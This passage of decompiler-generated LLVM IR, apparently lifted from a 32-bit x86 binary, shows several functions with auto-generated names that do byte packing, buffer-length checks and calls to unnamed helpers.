  uselistorder i32 28, { 10, 11, 8, 9, 24, 28, 37, 19, 12, 13, 0, 14, 15, 16, 17, 18, 3, 4, 5, 1, 29, 7, 20, 25, 26, 21, 22, 30, 31, 32, 33, 34, 35, 2, 36, 38, 27, 6, 23 }
  uselistorder i8 2, { 1, 2, 3, 4, 5, 17, 6, 0, 18, 14, 7, 8, 9, 10, 11, 15, 16, 12, 13 }
  uselistorder i8 8, { 0, 1, 3, 2, 4, 5, 6 }
}

define i32 @function_8051adc() local_unnamed_addr {
dec_label_pc_8051adc:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8051adc = load i32, i32* @edi, align 4
  %v0_8051add = load i32, i32* @esi, align 4
  %v0_8051ade = load i32, i32* @ebx, align 4
  store i32 %v0_8051ade, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @ebx, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @esi, align 4
  %v0_8051aeb = load i32, i32* @eax, align 4
  %v1_8051aee = inttoptr i32 %tmp to i32*
  %v2_8051aee = load i32, i32* %v1_8051aee, align 4
  %v7_8051af0 = inttoptr i32 %v2_8051aee to i8*
  %v8_8051af0 = call i32 @function_8052020(i8* %v7_8051af0, i32 %tmp2, i32 %tmp3, i32 %v0_8051aeb, i32 %v0_8051ade, i32 %v0_8051add, i32 %v0_8051adc)
  %v2_8051af8 = icmp slt i32 %v8_8051af0, 0
  store i32 %v8_8051af0, i32* @ecx, align 4
  br i1 %v2_8051af8, label %dec_label_pc_8051b29, label %dec_label_pc_8051afe

dec_label_pc_8051afe:                             ; preds = %dec_label_pc_8051adc
  %v0_8051afe = load i32, i32* @ebx, align 4
  %v2_8051afe = sub i32 %v0_8051afe, %v8_8051af0
  %v1_8051b00 = add i32 %v2_8051afe, -3
  %v6_8051b00 = sub i32 2, %v2_8051afe
  %v7_8051b00 = and i32 %v6_8051b00, %v2_8051afe
  %v8_8051b00 = icmp slt i32 %v7_8051b00, 0
  %v9_8051b00 = icmp eq i32 %v1_8051b00, 0
  %v10_8051b00 = icmp slt i32 %v1_8051b00, 0
  %v3_8051b03 = icmp eq i1 %v10_8051b00, %v8_8051b00
  %v4_8051b03 = icmp eq i1 %v9_8051b00, false
  %v5_8051b03 = and i1 %v4_8051b03, %v3_8051b03
  br i1 %v5_8051b03, label %dec_label_pc_8051b0a, label %dec_label_pc_8051b05

dec_label_pc_8051b05:                             ; preds = %dec_label_pc_8051afe
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8051b29

dec_label_pc_8051b0a:                             ; preds = %dec_label_pc_8051afe
  %v0_8051b0a = load i32, i32* @edi, align 4
  %v2_8051b0a = add i32 %v0_8051b0a, %v8_8051af0
  store i32 %v2_8051b0a, i32* @edx, align 4
  %v0_8051b0d = load i32, i32* @esi, align 4
  %v1_8051b0d = add i32 %v0_8051b0d, 5
  %v2_8051b0d = inttoptr i32 %v1_8051b0d to i8*
  %v3_8051b0d = load i8, i8* %v2_8051b0d, align 1
  %v1_8051b11 = add i32 %v8_8051af0, 4
  store i32 %v1_8051b11, i32* @ecx, align 4
  %v3_8051b14 = inttoptr i32 %v2_8051b0a to i8*
  store i8 %v3_8051b0d, i8* %v3_8051b14, align 1
  %v0_8051b16 = load i32, i32* @esi, align 4
  %v1_8051b16 = add i32 %v0_8051b16, 4
  %v2_8051b16 = inttoptr i32 %v1_8051b16 to i32*
  %v3_8051b16 = load i32, i32* %v2_8051b16, align 4
  %v1_8051b19 = trunc i32 %v3_8051b16 to i8
  %v2_8051b19 = load i32, i32* @edx, align 4
  %v3_8051b19 = add i32 %v2_8051b19, 1
  %v4_8051b19 = inttoptr i32 %v3_8051b19 to i8*
  store i8 %v1_8051b19, i8* %v4_8051b19, align 1
  %v0_8051b1c = load i32, i32* @esi, align 4
  %v1_8051b1c = add i32 %v0_8051b1c, 9
  %v2_8051b1c = inttoptr i32 %v1_8051b1c to i8*
  %v3_8051b1c = load i8, i8* %v2_8051b1c, align 1
  %v2_8051b20 = load i32, i32* @edx, align 4
  %v3_8051b20 = add i32 %v2_8051b20, 2
  %v4_8051b20 = inttoptr i32 %v3_8051b20 to i8*
  store i8 %v3_8051b1c, i8* %v4_8051b20, align 1
  %v0_8051b23 = load i32, i32* @esi, align 4
  %v1_8051b23 = add i32 %v0_8051b23, 8
  %v2_8051b23 = inttoptr i32 %v1_8051b23 to i32*
  %v3_8051b23 = load i32, i32* %v2_8051b23, align 4
  %v1_8051b26 = trunc i32 %v3_8051b23 to i8
  %v2_8051b26 = load i32, i32* @edx, align 4
  %v3_8051b26 = add i32 %v2_8051b26, 3
  %v4_8051b26 = inttoptr i32 %v3_8051b26 to i8*
  store i8 %v1_8051b26, i8* %v4_8051b26, align 1
  %v0_8051b2a.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051b29

dec_label_pc_8051b29:                             ; preds = %dec_label_pc_8051adc, %dec_label_pc_8051b05, %dec_label_pc_8051b0a
  %v0_8051b2a = phi i32 [ %v8_8051af0, %dec_label_pc_8051adc ], [ -1, %dec_label_pc_8051b05 ], [ %v0_8051b2a.pre, %dec_label_pc_8051b0a ]
  %v2_8051b29 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8051b29, i32* @ebx, align 4
  store i32 %v0_8051adc, i32* @edi, align 4
  ret i32 %v0_8051b2a

; uselistorder directives
  uselistorder i32 %v1_8051b00, { 1, 0 }
  uselistorder i32 %v2_8051afe, { 0, 2, 1 }
  uselistorder i32 %v8_8051af0, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 -3, { 3, 2, 1, 6, 4, 5, 0 }
  uselistorder label %dec_label_pc_8051b29, { 2, 1, 0 }
}

define i32 @function_8051b30() local_unnamed_addr {
dec_label_pc_8051b30:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp1 = call i32 @__decompiler_undefined_function_0()
  %v2_8051b3b = call i32 @function_805218c(i32 %tmp, i32 %tmp1)
  %v2_8051b40 = icmp slt i32 %v2_8051b3b, 0
  %v1_8051b42 = add i32 %v2_8051b3b, 4
  %v1_8051b45 = icmp eq i1 %v2_8051b40, false
  %v4_8051b45 = select i1 %v1_8051b45, i32 %v1_8051b42, i32 %v2_8051b3b
  ret i32 %v4_8051b45

; uselistorder directives
  uselistorder i32 %v2_8051b3b, { 1, 0, 2 }
}

define i32 @function_8051b4c() local_unnamed_addr {
dec_label_pc_8051b4c:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051b4c = load i32, i32* @ebp, align 4
  %v0_8051b4d = load i32, i32* @edi, align 4
  %v0_8051b4e = load i32, i32* @esi, align 4
  %v0_8051b4f = load i32, i32* @ebx, align 4
  store i32 %v0_8051b4f, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8051b70 = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_8051b70, i32* %eax.global-to-local, align 4
  %v4_8051b7d = call i32 @function_80520b0(i32 %tmp4, i32 %tmp7, i32 %v2_8051b70, i32 256)
  store i32 %v4_8051b7d, i32* %eax.global-to-local, align 4
  %v3_8051b85 = icmp slt i32 %v4_8051b7d, 0
  store i32 %v4_8051b7d, i32* @edi, align 4
  br i1 %v3_8051b85, label %dec_label_pc_8051c38, label %dec_label_pc_8051b8f

dec_label_pc_8051b8f:                             ; preds = %dec_label_pc_8051b4c
  %v0_8051b8f = load i32, i32* @ebx, align 4
  %v3_8051b8f = add i32 %v0_8051b8f, %v4_8051b7d
  %v0_8051b91 = load i32, i32* @esi, align 4
  %v2_8051b91 = sub i32 %v0_8051b91, %v3_8051b8f
  %v1_8051b93 = add i32 %v2_8051b91, -10
  %v10_8051b93 = icmp slt i32 %v1_8051b93, 0
  store i32 %v1_8051b93, i32* @esi, align 4
  %v1_8051b9e = icmp eq i1 %v10_8051b93, false
  br i1 %v1_8051b9e, label %dec_label_pc_8051ba7, label %dec_label_pc_8051ba0

dec_label_pc_8051ba0:                             ; preds = %dec_label_pc_8051b8f
  br label %dec_label_pc_8051c38

dec_label_pc_8051ba7:                             ; preds = %dec_label_pc_8051b8f
  %v6_8051bae = add i32 %v3_8051b8f, %tmp4
  store i32 %v6_8051bae, i32* @ebx, align 4
  store i32 %v2_8051b70, i32* %eax.global-to-local, align 4
  %v1_8051bba = call i32 @function_804d384(i32 %v2_8051b70)
  store i32 %v1_8051bba, i32* %eax.global-to-local, align 4
  %v0_8051bbf = load i32, i32* @ebx, align 4
  %v1_8051bbf = add i32 %v0_8051bbf, 4
  store i32 %v1_8051bbf, i32* %esi.global-to-local, align 4
  %v1_8051bc2 = load i32, i32* @ebp, align 4
  %v2_8051bc2 = inttoptr i32 %v1_8051bc2 to i32*
  store i32 %v1_8051bba, i32* %v2_8051bc2, align 4
  %v0_8051bc5 = load i32, i32* @ebx, align 4
  %v1_8051bc5 = inttoptr i32 %v0_8051bc5 to i8*
  %v2_8051bc5 = load i8, i8* %v1_8051bc5, align 1
  %v3_8051bc5 = zext i8 %v2_8051bc5 to i32
  store i32 %v3_8051bc5, i32* %eax.global-to-local, align 4
  %v1_8051bc8 = add i32 %v0_8051bc5, 1
  %v2_8051bc8 = inttoptr i32 %v1_8051bc8 to i8*
  %v3_8051bc8 = load i8, i8* %v2_8051bc8, align 1
  %v4_8051bc8 = zext i8 %v3_8051bc8 to i32
  store i32 %v4_8051bc8, i32* %edx.global-to-local, align 4
  %v2_8051bcc = mul nuw nsw i32 %v3_8051bc5, 256
  %v2_8051bcf = or i32 %v4_8051bc8, %v2_8051bcc
  store i32 %v2_8051bcf, i32* %eax.global-to-local, align 4
  %v1_8051bd1 = load i32, i32* @ebp, align 4
  %v2_8051bd1 = add i32 %v1_8051bd1, 4
  %v3_8051bd1 = inttoptr i32 %v2_8051bd1 to i32*
  store i32 %v2_8051bcf, i32* %v3_8051bd1, align 4
  %v0_8051bd4 = load i32, i32* @ebx, align 4
  %v1_8051bd4 = add i32 %v0_8051bd4, 2
  %v2_8051bd4 = inttoptr i32 %v1_8051bd4 to i8*
  %v3_8051bd4 = load i8, i8* %v2_8051bd4, align 1
  %v4_8051bd4 = zext i8 %v3_8051bd4 to i32
  store i32 %v4_8051bd4, i32* %eax.global-to-local, align 4
  %v1_8051bd8 = add i32 %v0_8051bd4, 3
  %v2_8051bd8 = inttoptr i32 %v1_8051bd8 to i8*
  %v3_8051bd8 = load i8, i8* %v2_8051bd8, align 1
  %v4_8051bd8 = zext i8 %v3_8051bd8 to i32
  store i32 %v4_8051bd8, i32* %edx.global-to-local, align 4
  %v2_8051bdc = mul nuw nsw i32 %v4_8051bd4, 256
  %v2_8051bdf = or i32 %v4_8051bd8, %v2_8051bdc
  store i32 %v2_8051bdf, i32* %eax.global-to-local, align 4
  %v1_8051be1 = load i32, i32* @ebp, align 4
  %v2_8051be1 = add i32 %v1_8051be1, 8
  %v3_8051be1 = inttoptr i32 %v2_8051be1 to i32*
  store i32 %v2_8051bdf, i32* %v3_8051be1, align 4
  %v0_8051be4 = load i32, i32* @ebx, align 4
  %v1_8051be4 = add i32 %v0_8051be4, 4
  %v2_8051be4 = inttoptr i32 %v1_8051be4 to i8*
  %v3_8051be4 = load i8, i8* %v2_8051be4, align 1
  %v4_8051be4 = zext i8 %v3_8051be4 to i32
  store i32 %v4_8051be4, i32* %edx.global-to-local, align 4
  %v0_8051be8 = load i32, i32* %esi.global-to-local, align 4
  %v1_8051be8 = add i32 %v0_8051be8, 1
  %v2_8051be8 = inttoptr i32 %v1_8051be8 to i8*
  %v3_8051be8 = load i8, i8* %v2_8051be8, align 1
  %v4_8051be8 = zext i8 %v3_8051be8 to i32
  store i32 %v4_8051be8, i32* %eax.global-to-local, align 4
  %v1_8051bec = add i32 %v0_8051be8, 2
  %v2_8051bec = inttoptr i32 %v1_8051bec to i8*
  %v3_8051bec = load i8, i8* %v2_8051bec, align 1
  %v4_8051bec = zext i8 %v3_8051bec to i32
  %v2_8051bf0 = mul nuw i32 %v4_8051be4, 16777216
  %v2_8051bf3 = mul nuw nsw i32 %v4_8051be8, 65536
  store i32 %v2_8051bf3, i32* %eax.global-to-local, align 4
  %v2_8051bf6 = or i32 %v2_8051bf3, %v2_8051bf0
  store i32 %v2_8051bf6, i32* %edx.global-to-local, align 4
  %v1_8051bf8 = add i32 %v0_8051be8, 3
  %v2_8051bf8 = inttoptr i32 %v1_8051bf8 to i8*
  %v3_8051bf8 = load i8, i8* %v2_8051bf8, align 1
  %v4_8051bf8 = zext i8 %v3_8051bf8 to i32
  store i32 %v4_8051bf8, i32* %eax.global-to-local, align 4
  %v2_8051bfc = mul nuw nsw i32 %v4_8051bec, 256
  %v2_8051bff = or i32 %v4_8051bf8, %v2_8051bf6
  store i32 %v2_8051bff, i32* %edx.global-to-local, align 4
  %v2_8051c01 = or i32 %v2_8051bff, %v2_8051bfc
  store i32 %v2_8051c01, i32* @ecx, align 4
  %v1_8051c03 = load i32, i32* @ebp, align 4
  %v2_8051c03 = add i32 %v1_8051c03, 12
  %v3_8051c03 = inttoptr i32 %v2_8051c03 to i32*
  store i32 %v2_8051c01, i32* %v3_8051c03, align 4
  %v0_8051c06 = load i32, i32* @ebx, align 4
  %v1_8051c06 = add i32 %v0_8051c06, 8
  %v2_8051c06 = inttoptr i32 %v1_8051c06 to i8*
  %v3_8051c06 = load i8, i8* %v2_8051c06, align 1
  %v4_8051c06 = zext i8 %v3_8051c06 to i32
  store i32 %v4_8051c06, i32* %edx.global-to-local, align 4
  %v1_8051c0a = add i32 %v0_8051c06, 9
  %v2_8051c0a = inttoptr i32 %v1_8051c0a to i8*
  %v3_8051c0a = load i8, i8* %v2_8051c0a, align 1
  %v4_8051c0a = zext i8 %v3_8051c0a to i32
  store i32 %v4_8051c0a, i32* %eax.global-to-local, align 4
  %v1_8051c0e = add i32 %v0_8051c06, 10
  %v1_8051c11 = load i32, i32* @ebp, align 4
  %v2_8051c11 = add i32 %v1_8051c11, 20
  %v3_8051c11 = inttoptr i32 %v2_8051c11 to i32*
  store i32 %v1_8051c0e, i32* %v3_8051c11, align 4
  %v0_8051c14 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051c14 = mul i32 %v0_8051c14, 256
  %v1_8051c17 = load i32, i32* %eax.global-to-local, align 4
  %v2_8051c17 = or i32 %v1_8051c17, %v2_8051c14
  store i32 %v2_8051c17, i32* @edx, align 4
  %v1_8051c19 = load i32, i32* @ebp, align 4
  %v2_8051c19 = add i32 %v1_8051c19, 16
  %v3_8051c19 = inttoptr i32 %v2_8051c19 to i32*
  store i32 %v2_8051c17, i32* %v3_8051c19, align 4
  %v1_8051c23 = add i32 %v3_8051b8f, 10
  store i32 %v1_8051c23, i32* %eax.global-to-local, align 4
  %v1_8051c26 = load i32, i32* @ebp, align 4
  %v2_8051c26 = add i32 %v1_8051c26, 24
  %v3_8051c26 = inttoptr i32 %v2_8051c26 to i32*
  store i32 %v1_8051c23, i32* %v3_8051c26, align 4
  %v4_8051c29 = load i32, i32* @edx, align 4
  %v5_8051c2d = icmp slt i32 %v1_8051b93, %v4_8051c29
  br i1 %v5_8051c2d, label %dec_label_pc_8051c2f, label %dec_label_pc_8051c34

dec_label_pc_8051c2f:                             ; preds = %dec_label_pc_8051ba7
  br label %dec_label_pc_8051c38

dec_label_pc_8051c34:                             ; preds = %dec_label_pc_8051ba7
  %v1_8051c34 = load i32, i32* @edi, align 4
  %v2_8051c34 = add i32 %v4_8051c29, 10
  %v3_8051c34 = add i32 %v2_8051c34, %v1_8051c34
  br label %dec_label_pc_8051c38

dec_label_pc_8051c38:                             ; preds = %dec_label_pc_8051b4c, %dec_label_pc_8051c2f, %dec_label_pc_8051ba0, %dec_label_pc_8051c34
  %v0_8051c3e = phi i32 [ %v4_8051b7d, %dec_label_pc_8051b4c ], [ -1, %dec_label_pc_8051c2f ], [ %v1_8051b93, %dec_label_pc_8051ba0 ], [ %v3_8051c34, %dec_label_pc_8051c34 ]
  store i32 %v0_8051c3e, i32* %eax.global-to-local, align 4
  %v2_8051c40 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8051c40, i32* @ebx, align 4
  store i32 %v0_8051b4e, i32* @esi, align 4
  store i32 %v0_8051b4d, i32* @edi, align 4
  store i32 %v0_8051b4c, i32* @ebp, align 4
  ret i32 %v0_8051c3e

; uselistorder directives
  uselistorder i32 %v0_8051c3e, { 1, 0 }
  uselistorder i32 %v2_8051bf3, { 1, 0 }
  uselistorder i32 %v1_8051b93, { 0, 1, 3, 2 }
  uselistorder i32 %v3_8051b8f, { 1, 0, 2 }
  uselistorder i32 %v4_8051b7d, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v2_8051b70, { 1, 2, 0, 3 }
  uselistorder i32 24, { 5, 6, 13, 0, 7, 8, 9, 14, 2, 3, 12, 4, 10, 15, 16, 17, 18, 19, 20, 21, 22, 1, 11 }
  uselistorder i32 20, { 15, 16, 17, 20, 2, 24, 18, 6, 19, 21, 22, 3, 25, 26, 0, 11, 12, 14, 13, 27, 28, 29, 30, 31, 7, 32, 33, 34, 23, 4, 8, 5, 9, 10, 1 }
  uselistorder i32 9, { 7, 8, 9, 10, 1, 11, 2, 12, 13, 0, 4, 14, 15, 16, 17, 3, 5, 6 }
  uselistorder i32 16777216, { 0, 2, 1, 4, 3, 6, 5, 9, 7, 10, 8, 12, 11, 13 }
  uselistorder i32 3, { 34, 35, 36, 37, 38, 39, 21, 0, 13, 1, 22, 2, 17, 42, 3, 40, 23, 5, 4, 6, 10, 11, 9, 24, 14, 25, 32, 20, 26, 7, 33, 27, 41, 18, 19, 28, 8, 15, 16, 12, 29, 30, 31 }
  uselistorder i32 (i32)* @function_804d384, { 2, 1, 0, 3 }
  uselistorder i32 -10, { 1, 0 }
  uselistorder label %dec_label_pc_8051c38, { 3, 1, 2, 0 }
}

define i32 @function_8051c48() local_unnamed_addr {
dec_label_pc_8051c48:
  %v3_8051c55 = call i32 @function_804b90c(i32 ptrtoint ([11 x i8]* @global_var_80549e5.211 to i32), i32 ptrtoint (i32* @global_var_80549b0.199 to i32))
  store i32 %v3_8051c55, i32* @eax, align 4
  %v1_8051c5d = icmp eq i32 %v3_8051c55, 0
  %v1_8051c5f = icmp eq i1 %v1_8051c5d, false
  br i1 %v1_8051c5f, label %dec_label_pc_8051c75, label %dec_label_pc_8051c61

dec_label_pc_8051c61:                             ; preds = %dec_label_pc_8051c48
  %v3_8051c6d = call i32 @function_804b90c(i32 ptrtoint ([18 x i8]* @global_var_80549f0.212 to i32), i32 ptrtoint (i32* @global_var_80549b0.199 to i32))
  br label %dec_label_pc_8051c75

dec_label_pc_8051c75:                             ; preds = %dec_label_pc_8051c48, %dec_label_pc_8051c61
  %v0_8051c78 = phi i32 [ %v3_8051c55, %dec_label_pc_8051c48 ], [ %v3_8051c6d, %dec_label_pc_8051c61 ]
  ret i32 %v0_8051c78

; uselistorder directives
  uselistorder i32 (i32, i32)* @function_804b90c, { 5, 4, 3, 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_80549b0.199 to i32), { 0, 1, 2, 4, 3, 5 }
  uselistorder label %dec_label_pc_8051c75, { 1, 0 }
}

define i32 @function_8051c79(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_8051c79:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp60 = ptrtoint i32* %arg5 to i32
  %stack_var_-44 = alloca i8*, align 4
  %v0_8051c79 = load i32, i32* @ebp, align 4
  %v0_8051c7a = load i32, i32* @edi, align 4
  %v0_8051c7b = load i32, i32* @esi, align 4
  %v0_8051c7c = load i32, i32* @ebx, align 4
  store i32 %arg6, i32* @ebx, align 4
  store i32 %arg7, i32* %edx.global-to-local, align 4
  %v1_8051c8a = sub i32 0, %arg6
  %v1_8051c8c = urem i32 %v1_8051c8a, 4
  %v2_8051c8c = icmp eq i32 %v1_8051c8c, 0
  store i32 %v1_8051c8c, i32* %eax.global-to-local, align 4
  br i1 %v2_8051c8c, label %dec_label_pc_8051c9d, label %dec_label_pc_8051c91

dec_label_pc_8051c91:                             ; preds = %dec_label_pc_8051c79
  %v2_8051c91 = sub i32 %arg7, %v1_8051c8c
  %v7_8051c91 = icmp ugt i32 %v1_8051c8c, %arg7
  br i1 %v7_8051c91, label %dec_label_pc_8051f41, label %dec_label_pc_8051c99

dec_label_pc_8051c99:                             ; preds = %dec_label_pc_8051c91
  %v2_8051c99 = add i32 %v1_8051c8c, %arg6
  store i32 %v2_8051c99, i32* @ebx, align 4
  store i32 %v2_8051c91, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8051c9d

dec_label_pc_8051c9d:                             ; preds = %dec_label_pc_8051c79, %dec_label_pc_8051c99
  %v0_8051cab = phi i32 [ %arg6, %dec_label_pc_8051c79 ], [ %v2_8051c99, %dec_label_pc_8051c99 ]
  %v0_8051cb2 = phi i32 [ %arg7, %dec_label_pc_8051c79 ], [ %v2_8051c91, %dec_label_pc_8051c99 ]
  %tmp = icmp ult i32 %v0_8051cb2, 32
  br i1 %tmp, label %dec_label_pc_8051f41, label %dec_label_pc_8051ca6

dec_label_pc_8051ca6:                             ; preds = %dec_label_pc_8051c9d
  %v12_8051ca6 = icmp eq i32 %arg4, 1
  %v1_8051cab = add i32 %v0_8051cab, 32
  store i32 %v1_8051cab, i32* %eax.global-to-local, align 4
  %v1_8051cb2 = add i32 %v0_8051cb2, -32
  store i32 %v1_8051cb2, i32* @ebp, align 4
  br i1 %v12_8051ca6, label %dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge, label %dec_label_pc_8051cbb

dec_label_pc_8051ca6.dec_label_pc_8051df1_crit_edge: ; preds = %dec_label_pc_8051ca6
  %.pre = inttoptr i32 %arg9 to i32*
  br label %dec_label_pc_8051df1

dec_label_pc_8051cbb:                             ; preds = %dec_label_pc_8051ca6
  store i32 %arg9, i32* %eax.global-to-local, align 4
  %v1_8051cc2 = inttoptr i32 %arg9 to i32*
  store i32 -1, i32* %v1_8051cc2, align 4
  %tmp140 = icmp ult i32 %v1_8051cb2, 4
  br i1 %tmp140, label %dec_label_pc_8051f41, label %dec_label_pc_8051cce

dec_label_pc_8051cce:                             ; preds = %dec_label_pc_8051cbb
  %v0_8051cce = load i32, i32* %edx.global-to-local, align 4
  %v1_8051cce = add i32 %v0_8051cce, -36
  store i32 %v1_8051cce, i32* %eax.global-to-local, align 4
  %tmp141 = icmp ult i32 %v1_8051cce, 8
  br i1 %tmp141, label %dec_label_pc_8051f41, label %dec_label_pc_8051cda

dec_label_pc_8051cda:                             ; preds = %dec_label_pc_8051cce
  %v0_8051cda = load i32, i32* @ebp, align 4
  %tmp142 = icmp ult i32 %v0_8051cda, 16
  br i1 %tmp142, label %dec_label_pc_8051f41, label %dec_label_pc_8051ce3

dec_label_pc_8051ce3:                             ; preds = %dec_label_pc_8051cda
  %v1_8051ce3 = add i32 %v0_8051cce, -48
  store i32 %v1_8051ce3, i32* %eax.global-to-local, align 4
  %tmp143 = icmp ult i32 %v1_8051ce3, 8
  br i1 %tmp143, label %dec_label_pc_8051f41, label %dec_label_pc_8051cef

dec_label_pc_8051cef:                             ; preds = %dec_label_pc_8051ce3
  %v0_8051cef = load i32, i32* @ebx, align 4
  %v1_8051cef = add i32 %v0_8051cef, 48
  %v1_8051cf2 = add i32 %v0_8051cce, -44
  store i32 %v1_8051cf2, i32* @ebp, align 4
  %v1_8051cf9 = add i32 %v0_8051cce, -56
  store i32 %v1_8051cf9, i32* @eax, align 4
  %v7_8051cfc = icmp ult i32 %v1_8051cf9, %v1_8051cf2
  %v1_8051cfe = add i32 %v0_8051cef, 36
  store i32 %v1_8051cfe, i32* @edi, align 4
  br i1 %v7_8051cfc, label %dec_label_pc_8051d08, label %dec_label_pc_8051d03

dec_label_pc_8051d03:                             ; preds = %dec_label_pc_8051cef
  %v1_8051d03 = add i32 %v0_8051cef, 44
  store i32 %v1_8051d03, i32* @esi, align 4
  br label %dec_label_pc_8051d0d

dec_label_pc_8051d08:                             ; preds = %dec_label_pc_8051cef
  %v1_8051d08 = add i32 %v0_8051cef, 56
  store i32 %v1_8051d08, i32* @esi, align 4
  store i32 %v1_8051cf9, i32* @ebp, align 4
  br label %dec_label_pc_8051d0d

dec_label_pc_8051d0d:                             ; preds = %dec_label_pc_8051d03, %dec_label_pc_8051d08
  %v0_8051d0d = phi i32 [ %v1_8051cf2, %dec_label_pc_8051d03 ], [ %v1_8051cf9, %dec_label_pc_8051d08 ]
  %tmp144 = icmp ult i32 %v0_8051d0d, 80
  br i1 %tmp144, label %dec_label_pc_8051f41, label %dec_label_pc_8051d16

dec_label_pc_8051d16:                             ; preds = %dec_label_pc_8051d0d
  %v0_8051d16 = call i32 @function_8051c48()
  store i32 %v0_8051d16, i32* %eax.global-to-local, align 4
  %v1_8051d1b = icmp eq i32 %v0_8051d16, 0
  br i1 %v1_8051d1b, label %dec_label_pc_8051d43, label %dec_label_pc_8051d23

dec_label_pc_8051d23:                             ; preds = %dec_label_pc_8051d16
  store i32 %v1_8051cab, i32* %edx.global-to-local, align 4
  store i32 %v1_8051cef, i32* %eax.global-to-local, align 4
  %v0_8051d2b = load i32, i32* @edi, align 4
  %v0_8051d2f = load i32, i32* @esi, align 4
  %v4_8051d33 = inttoptr i32 %v1_8051cab to i8*
  br label %dec_label_pc_8051df1

dec_label_pc_8051d43:                             ; preds = %dec_label_pc_8051d16
  store i32 %arg8, i32* %edx.global-to-local, align 4
  %v1_8051d47 = inttoptr i32 %arg8 to i32*
  store i32 0, i32* %v1_8051d47, align 4
  %v1_8051d4d = call i32 @function_804b7f4(i32 0)
  store i32 %v1_8051d4d, i32* %eax.global-to-local, align 4
  %v1_8051d52 = inttoptr i32 %v1_8051d4d to i32*
  %v2_8051d52 = load i32, i32* %v1_8051d52, align 4
  store i32 %v2_8051d52, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051f41

dec_label_pc_8051d5d:                             ; preds = %dec_label_pc_8051ec4
  %v2_8051d5d = load i8*, i8** %stack_var_-44, align 4
  %v3_8051d5d = ptrtoint i8* %v2_8051d5d to i32
  store i32 %v3_8051d5d, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-40.0, i32* %eax.global-to-local, align 4
  %v2_8051d64 = inttoptr i32 %stack_var_-40.0 to i32*
  store i32 %v3_8051d5d, i32* %v2_8051d64, align 4
  %v0_8051d66 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051d66 = add i32 %v0_8051d66, 4
  %v2_8051d66 = inttoptr i32 %v1_8051d66 to i32*
  store i32 0, i32* %v2_8051d66, align 4
  %v0_8051d6d = load i32, i32* @ebx, align 4
  %v1_8051d6d = add i32 %v0_8051d6d, 4
  %v2_8051d6d = inttoptr i32 %v1_8051d6d to i32*
  %v3_8051d6d = load i32, i32* %v2_8051d6d, align 4
  store i32 %v3_8051d6d, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8051d6d, i32* %arg5, align 4
  %v1_8051d76 = add i32 %tmp60, 8
  %v2_8051d76 = inttoptr i32 %v1_8051d76 to i32*
  store i32 2, i32* %v2_8051d76, align 4
  %v0_8051d7d = load i32, i32* %edx.global-to-local, align 4
  %v1_8051d7d = add i32 %v0_8051d7d, 12
  %v2_8051d7d = inttoptr i32 %v1_8051d7d to i32*
  store i32 4, i32* %v2_8051d7d, align 4
  br label %dec_label_pc_8051db6

dec_label_pc_8051d8a:                             ; preds = %dec_label_pc_8051ee6
  store i32 %stack_var_-36.0, i32* %eax.global-to-local, align 4
  store i32 %storemerge3, i32* %edx.global-to-local, align 4
  %v2_8051d92 = inttoptr i32 %storemerge3 to i32*
  store i32 %stack_var_-36.0, i32* %v2_8051d92, align 4
  %v0_8051d94 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051d94 = add i32 %v0_8051d94, 4
  %v2_8051d94 = inttoptr i32 %v1_8051d94 to i32*
  store i32 0, i32* %v2_8051d94, align 4
  %v0_8051d9b = load i32, i32* @ebx, align 4
  %v1_8051d9b = add i32 %v0_8051d9b, 4
  %v2_8051d9b = inttoptr i32 %v1_8051d9b to i32*
  %v3_8051d9b = load i32, i32* %v2_8051d9b, align 4
  store i32 %v3_8051d9b, i32* %eax.global-to-local, align 4
  store i32 %tmp60, i32* %edx.global-to-local, align 4
  store i32 %v3_8051d9b, i32* %arg5, align 4
  %v1_8051da4 = add i32 %tmp60, 8
  %v2_8051da4 = inttoptr i32 %v1_8051da4 to i32*
  store i32 10, i32* %v2_8051da4, align 4
  %v0_8051dab = load i32, i32* %edx.global-to-local, align 4
  %v1_8051dab = add i32 %v0_8051dab, 12
  %v2_8051dab = inttoptr i32 %v1_8051dab to i32*
  store i32 16, i32* %v2_8051dab, align 4
  br label %dec_label_pc_8051db6

dec_label_pc_8051db6:                             ; preds = %dec_label_pc_8051d5d, %dec_label_pc_8051d8a
  %storemerge = phi i32 [ %stack_var_-40.0, %dec_label_pc_8051d5d ], [ %storemerge3, %dec_label_pc_8051d8a ]
  %v1_8051db6 = load i32, i32* %edx.global-to-local, align 4
  %v2_8051db6 = add i32 %v1_8051db6, 16
